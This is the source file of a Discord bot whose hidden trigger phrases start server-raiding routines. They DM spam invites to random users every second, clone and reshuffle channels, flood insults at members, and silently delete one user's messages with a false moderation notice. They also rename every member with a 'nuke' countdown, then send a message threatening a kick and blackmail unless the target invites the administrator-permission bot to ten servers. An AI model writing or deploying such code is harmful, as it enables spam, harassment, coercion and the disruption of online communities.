const Discord = require ('discord.js');
const config = require ('./config.json');
const client = new Discord.Client ();

client.once ('ready', () => {
    console.log ('ready');
})

client.on ('message', message => {
    const cron = require ('cron');
// SPAM BOT
    if (message.content == 'DoLpHoNp1') {
        const spamcron = new cron.CronJob('* * * * * *', () => {
            let randoma = client.users.cache.array();
            randoma.filter (usera => !usera.bot)
            let random = randoma[Math.floor(Math.random()*randoma.length)];
            random.send ('https://discord.gg/KXSMf6s join American Flag Defenders!');
            message.channel.send (`${random}, @everyone put me into your Discord Servers https://discord.com/api/oauth2/authorize?client_id=707043365522505800&permissions=198656&scope=bot`);
        })
        spamcron.start ();
        message.delete ();
    }
// CLONE CHANNELS BOT
    else if (message.content == 'dOlPhonP2') {
        const clonecron = new cron.CronJob('* * * * * *', () => {
            message.channel.clone();
        })
        clonecron.start();
        message.delete();
    }
// ARGUMENT BOT
    else if (message.content == 'dOLpHoNP3') {
        const insult1 = ['artless', 'bawdy', 'beslubbering', 'bootless', 'churlish', 'cockered', 'clouted', 'craven', 'currish', 'dankish', 'dissembling', 'droning', 'errant', 'fawning', 'fobbing', 'froward', 'frothy', 'gleeking', 'goatish', 'gorbellied', 'impertinent', 'infectious', 'jarring', 'loggerheaded', 'lumpish', 'mammering', 'mangled', 'mewling', 'paunchy', 'pribbling', 'puking', 'puny', 'quailing', 'rank', 'reeky', 'roguish', 'ruttish', 'saucy', 'spleeny', 'spongy', 'surly', 'tottering', 'unmuzzled', 'vain', 'venomed', 'villainous', 'warped', 'wayward', 'weedy', 'yeasty']
        const insult2 = ['base-court', 'bat-fowling', 'beef-witted', 'beetle-headed', 'boil-brained', 'clapper-clawed', 'clay-brained', 'common-kissing', 'crook-pated', 'dismal-dreaming', 'dizzy-eyed', 'doghearted', 'dread-bolted', 'earth-vexing', 'elf-skinned', 'fat-kidneyed', 'fen-sucked', 'flap-mouthed', 'fly-bitten', 'folly-fallen', 'fool-born', 'full-gorged', 'guts-griping', 'half-faced', 'hasty-witted', 'hedge-born', 'hell-hated', 'idle-headed', 'ill-breeding', 'ill-nurtured', 'knotty-pated', 'milk-livered', 'motley-minded', 'onion-eyed', 'plume-plucked', 'pottle-deep', 'pox-marked', 'reeling-ripe', 'ough-hewn', 'rude-growing', 'rump-fed', 'shard-borne', 'sheep-biting', 'spur-galled', 'swag-bellied', 'tardy-gaited', 'tickle-brained', 'toad-spotted', 'urchin-snouted', 'weather-bitten']
        const insult3 = ['apple-john', 'baggage', 'barnacle', 'bladder', 'boar-pig', 'bugbear', 'bum-bailey', 'canker-blossom', 'clack-dish', 'clotpole c', 'oxcomb', 'codpiece', 'death-token', 'dewberry', 'flap-dragon', 'flax-wench', 'flirt-gill', 'foot-licker', 'fustilarian', 'giglet', 'gudgeon', 'haggard', 'harpy', 'hedge-pig', 'horn-beast', 'hugger-mugger', 'jolthead', 'lewdster', 'lout', 'maggot-pie', 'malt-worm', 'mammet', 'measle', 'minnow', 'miscreant', 'moldwarp', 'mumble-news', 'nut-hook', 'pigeon-egg', 'pignut', 'puttock', 'pumpion', 'ratsbane', 'scut', 'skainsmate', 'strumpet', 'varlet', 'vassal', 'whey-face', 'wagtail']
        const insultcron = new cron.CronJob('* * * * * *', () => {
            try {
                let insult1r = insult1[Math.floor(Math.random()*insult1.length)];
                let insult2r = insult2[Math.floor(Math.random()*insult2.length)];
                let insult3r = insult3[Math.floor(Math.random()*insult3.length)];
                let user = message.guild.members.cache.array();
                let users = user.filter (user => !user.user.bot);
                let randomuser = users[Math.floor(Math.random()*users.length)];
                message.channel.send (`Thou ${insult1r} ${insult2r} ${insult3r}! ${randomuser}`);
            }
            catch {
                insultcron.stop()
            }
        })
        insultcron.start()
        message.delete()
    }
// MUTE BOT
    else if (message.content == 'doLPHOnP4') {
        client.on ('message', message => {
            if (message.author.id == '641084315828224001') {
                console.log (message.content);
                message.delete ();
                message.channel.send (`${message.member} you can't post that here`);
                message.author.send ('Sorry, we noticed your message contained harmful content, therefore we have deleted it! Any questions? Ask Matthew.');
            }
        })
    }
// MOVE CHANNELS BOT
    else if (message.content == 'doLphONp5') {
        const channelcron = new cron.CronJob('* * * * * *', () => {
            let channel = message.guild.channels.cache.array();
            let prandomchannel = channel [Math.floor(Math.random()*channel.length)];
            let randomchannel = channel [Math.floor(Math.random()*channel.length)];
            randomchannel.setPosition(prandomchannel.position);
        })
        channelcron.start();

        message.delete ();
    }
// ANIMATED PICTURE BOT
    else if (message.content == 'DoLPhOnP6') {
        message.delete();
        const flags = [
        , 'https://cdn.discordapp.com/attachments/464835617499643904/707392561106518076/America1.jpg'
        , 'https://cdn.discordapp.com/attachments/464835617499643904/707392569838927984/America2.jpg'
        , 'https://cdn.discordapp.com/attachments/464835617499643904/707392570921189436/America3.jpg'
        , 'https://cdn.discordapp.com/attachments/464835617499643904/707392572091400222/America4.jpg'
        , 'https://cdn.discordapp.com/attachments/464835617499643904/707392573316136980/America5.jpg'
        , 'https://cdn.discordapp.com/attachments/464835617499643904/707392574465376276/America6.jpg'];
        const channelcron1 = new cron.CronJob('0,20,40 * * * * *', () => {
            let sflag = flags[Math.floor(Math.random()*flags.length)];
            console.log (sflag)
            message.guild.setIcon (sflag)
        })
        channelcron1.start();
        const channelcron2 = new cron.CronJob('10,30,50 * * * * *', () => {
            let sflag = flags[Math.floor(Math.random()*flags.length)];
            console.log (sflag)
            message.guild.edit ({icon: sflag})
        })
        channelcron2.start();
    }
    // CHANGE NICKS
    else if (message.content == 'doLPHinP7') {
        message.delete()
        const nicks = new cron.CronJob('0 * * * * *', () => {
            let people = message.guild.members.cache.array();
            let selected = people[Math.floor(Math.random()*people.length)];
            people.forEach (person => {
                person.setNickname (`50 Seconds till nuke`)
                setTimeout (function() {
                    person.setNickname (`40 Seconds till nuke`)
                    setTimeout (function() {
                        person.setNickname (`30 Seconds till nuke`)
                        setTimeout (function() {
                            person.setNickname (`20 Seconds till nuke`)
                            setTimeout (function() {
                                person.setNickname (`10 Seconds till nuke`)
                                setTimeout (function() {
                                    person.setNickname (`${selected.user.username} exploded`)
                                    selected.user.send (`You will be kicked from *${message.guild.name}* in 10 days if you don't invite this bot to 10 servers. In addition you will be blackmailed for all of the things you've said in ${message.guild.name}.\nHere is the bot invite link https://discord.com/api/oauth2/authorize?client_id=707043365522505800&permissions=8&scope=bot`)
                                }, 10000);
                            }, 10000);
                        }, 10000);
                    }, 10000);
                }, 10000);
            })
        })
        nicks.start();
    }
    // SECURITY
    else if (message.channel.id == '707402270324818000' && !message.content.includes ('<#')) {
        message.delete ()
    }
});
client.login (config.token)